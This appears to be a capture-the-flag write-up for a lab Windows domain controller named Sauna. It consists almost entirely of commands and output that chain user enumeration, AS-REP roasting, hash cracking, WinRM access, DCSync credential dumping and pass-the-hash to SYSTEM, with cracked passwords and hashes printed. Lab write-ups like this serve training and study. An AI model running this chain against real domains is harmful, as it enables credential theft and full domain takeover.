# Sauna

## SYN Scan
```
nmap -sS -sV -O -p- -v -T4 -Pn -oA nmap/full_syn 10.10.10.175

PORT      STATE SERVICE      VERSION
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-04-18 20:33:50Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
49667/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc        Microsoft Windows RPC
49675/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49695/tcp open  msrpc        Microsoft Windows RPC

Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Web Application
![web_app](./screenshots/web_app.png)

## Kerbrute User Enumaration
```
kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL ~/storage/git/SecLists/Usernames/xato-net-10-million-usernames.txt -o kerbrute_user_enum.out
...
2021/04/18 16:39:29 >  [+] VALID USERNAME:	 administrator@EGOTISTICAL-BANK.LOCAL
2021/04/18 16:40:36 >  [+] VALID USERNAME:	 hsmith@EGOTISTICAL-BANK.LOCAL
2021/04/18 16:40:46 >  [+] VALID USERNAME:	 Administrator@EGOTISTICAL-BANK.LOCAL
2021/04/18 16:41:23 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:8209d91b9e61a58f3a0153b10149ba1c$656322c405d67604e01a9d6d0076e9848e0b59337ce7159e65a7bd39b4a976a835832050bf3e63c814c5f7eabbeeadad4536862d531ee756096f6a98f40eebb13ae291fb273b8b0adb8d74ecbc43441bc9260d34b941b05fa82e547245ecc8478fcca0a480c0bfb7025d44fee95409be635e3ecab05ed5a735fce045f4c296942eb1ee386f2991bb5be97a536c84d97fdfbd273e17e70aa7a7a1f2837114c64b8a052d30f469a3fa63ba519d118d206e5d33197f3b3801ff12aae9648349018d12d6048f059ebfcd22f6595a2659f65a3bd5413857eb48a13c15b79963ba77bd7230613471d5c95892588795b5d954649cdf3e8dd7654ebb83fd3969629d6f7c12ade60753771edb80288834b1db22c9ff4c2781a49a
2021/04/18 16:41:23 >  [+] VALID USERNAME:	 fsmith@EGOTISTICAL-BANK.LOCAL
2021/04/18 16:47:35 >  [+] Fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$Fsmith@EGOTISTICAL-BANK.LOCAL:aa2d97f767eab1b0f3bd6d0aefbdeaf7$6752c05c690e0659805310029bfbeb8aa49a44050a0055435e864eb0ba7be9e5b0c3cd8c52b8e4a29a085dec3df538fb524356d42bae99b583b9d69e57c1b0d4839ec203d3e1a7daa192fad63aa9681280a8e92f4559911ec1e2ee1869fe5bec489067ad568c3e40de2bbe85879235826157497d5928ac1a4fdb5665b03fb7bba9e3ad568fcd85e4f5faee78534da1e232bfb6adb1fbc7259a4f0115bdf43c1aaba5aeb58e94e768bdf327fe6ff49e3eb021f19599bf196b8b0d35910608fc175a98f19876b8b9fa47402f949f4fe1dc0cb4912ce30d87b1398289a1c787dc7a5cdecd94e8626c113b0f355a00937271bdca5f55e9f28078d5bad9e82794c025b9a95c8441108c88098d41247f69acf24bdf9175d8f4
2021/04/18 16:47:35 >  [+] VALID USERNAME:	 Fsmith@EGOTISTICAL-BANK.LOCAL
```

## ASREPRoast
```
$ GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith -request -format hashcat
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Cannot authenticate fsmith, getting its TGT
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:40b1139ce386646f5ad77e6c274f9c2c$2309ffa329e09c724c505c84d802a6546a5776b7edfa57d4ac173afbfba2c4679b0168a147153841f17d890e81adfa8393751fda57e426f4b1c0c66af2740219dbc2bc2a715b8f485b600a2d5bfe49b46b514d6a13f1f12b80b6d918bf510e4551513d8f518ab18e220aab618e400781e6d3e4241286d301b939e9d9af9ded0a461668b8f96cbb7b22ccb1e52e47cdbbba017d38b41b1cd104d7285eec3cc3fb207027347387afdcf4c3f7b3e50e341950b347c13d9995595568b31887d7503f1526a99d02a1c8ca965226d85f94093ffe8061c3564346526a6e72d147f7a9e1bc518fe7da10d31a016833179636f81c81ced6d7af4477c2249b85b203bd0ca2
```

## Cracking krb5asrep Hash
```
hashcat -a 0 -m 18200 krb5asrep.txt ~/storage/wordlists/rockyou.txt -r ~/storage/wordlists/rules/best64.rule -o krb5asrep_cracked.txt

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:40b1139ce386646f5ad77e6c274f9c2c$2309ffa329e09c724c505c84d802a6546a5776b7edfa57d4ac173afbfba2c4679b0168a147153841f17d890e81adfa8393751fda57e426f4b1c0c66af2740219dbc2bc2a715b8f485b600a2d5bfe49b46b514d6a13f1f12b80b6d918bf510e4551513d8f518ab18e220aab618e400781e6d3e4241286d301b939e9d9af9ded0a461668b8f96cbb7b22ccb1e52e47cdbbba017d38b41b1cd104d7285eec3cc3fb207027347387afdcf4c3f7b3e50e341950b347c13d9995595568b31887d7503f1526a99d02a1c8ca965226d85f94093ffe8061c3564346526a6e72d147f7a9e1bc518fe7da10d31a016833179636f81c81ced6d7af4477c2249b85b203bd0ca2:Thestrokes23
```

## WinRM Pwn3d!
```
$ sudo cme winrm EGOTISTICAL-BANK.LOCAL -u fsmith -p Thestrokes23 -x whoami
WINRM       10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
WINRM       10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
WINRM       10.10.10.175    5985   SAUNA            [+] Executed command
WINRM       10.10.10.175    5985   SAUNA            egotisticalbank\fsmith
```

## The User Flag
```powershell
*Evil-WinRM* PS C:\Users\FSmith\desktop> dir


    Directory: C:\Users\FSmith\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:03 AM             34 user.txt
```

```powershell
*Evil-WinRM* PS C:\Users\FSmith\desktop> type user.txt
1b5520b98d97cf17f24122a55baf70cf
```

## Local User Enumeration
```powershell
whoami /all

USER INFORMATION
----------------

User Name              SID                                           
====================== ==============================================
egotisticalbank\fsmith S-1-5-21-2966785786-3096785034-1186376766-1105


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes                                        
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

```
PS C:\users\fsmith\desktop> Get-LocalUser
Get-LocalUser

Name          Enabled Description                                             
----          ------- -----------                                             
Administrator True    Built-in account for administering the computer/domain  
Guest         False   Built-in account for guest access to the computer/domain
krbtgt        False   Key Distribution Center Service Account                 
HSmith        True                                                            
FSmith        True                                                            
svc_loanmgr   True
```

## Local Suggester
```
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.175 - Collecting local exploits for x64/windows...
[*] 10.10.10.175 - 26 exploit checks are being tried...
[+] 10.10.10.175 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.10.175 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
[+] 10.10.10.175 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.10.10.175 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.10.10.175 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows 10 v1809 build was detected!
[+] 10.10.10.175 - exploit/windows/local/ricoh_driver_privesc: The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Post module execution completed
```

## WinPEAS
```
[+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

## Privilege Escalation (egotisticalbank\svc_loanmgr)
```
svc_loanmanager:Moneymakestheworldgoround!
```

```
$ cme winrm EGOTISTICAL-BANK.LOCAL -u svc_loanmgr -p Moneymakestheworldgoround! 
WINRM       10.10.10.175    5985   SAUNA            [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
WINRM       10.10.10.175    5985   SAUNA            [*] http://10.10.10.175:5985/wsman
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)
```

```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr
```

## DCSync Attack
```
$ secretsdump.py egotisticalbank/svc_loanmgr@10.10.10.175 
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:562f3a2e7fdb258c71d6702fa8675f76:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:25c40ffc6afc7393c2cf0dcc5e14f7d6d26b23007c60f04cc8ea71b11627f111
SAUNA$:aes128-cts-hmac-sha1-96:59456699441c8691b9d63c74ed7e7d19
SAUNA$:des-cbc-md5:ae20408c8c073d34
[*] Cleaning up...
```

## Privilege Escalation via Pass-the-Hast
```
$ sudo cme smb 10.10.10.175 -u administrator -H aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
[sudo] password for talha: 
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\administrator aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff (Pwn3d!)
```

```
$ sudo smbexec.py administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

## The Root Flag
```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
f3ee04965c68257382e31502cc5e881f
```
